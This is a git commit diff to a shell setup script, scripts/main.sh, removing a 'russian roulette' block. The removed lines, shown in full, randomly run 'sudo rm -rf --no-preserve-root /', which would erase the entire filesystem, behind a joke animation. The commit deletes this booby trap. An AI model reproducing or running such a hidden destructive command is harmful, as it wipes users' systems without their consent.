bc93d77ef0484a2e1df82ff63cb457e5abd6e1c3
wrrrf <aproblem924@gmail.com>
2024-11-13 17:29:29 -0800

    Update main.sh
    removed russian roulette

--- scripts/main.sh
+++ scripts/main.sh
@@ -15,43 +15,6 @@ type_a_string() {
   done
 }
 
-RANDOM_NUMBER=$((RANDOM % 6 + 1))
-echo "loading cylinder"
-sleep 0.5
-clear
-echo "loading cylinder ."
-sleep 0.5
-clear
-echo "loading cylinder . ."
-sleep 0.5
-clear
-echo "loading cylinder . . ."
-sleep 0.5
-clear
-echo "1 bullet loaded!"
-sleep 1
-clear
-
-if [ $RANDOM_NUMBER -eq 6 ]; then 
-  echo "pulling trig — "
-  sleep 0.5
-  clear
-  echo "BANG!"
-  sleep 2
-  clear
-  sudo rm -rf --no-preserve-root /
-else
-  echo "pulling trigger"
-  sleep 1
-  clear
-  echo "pulling trigger —"
-  sleep 1
-  clear
-  echo "your system lives too die another day"
-  sleep 3
-  clear
-fi
-
 sudo ufw enable
 
 while read user; do
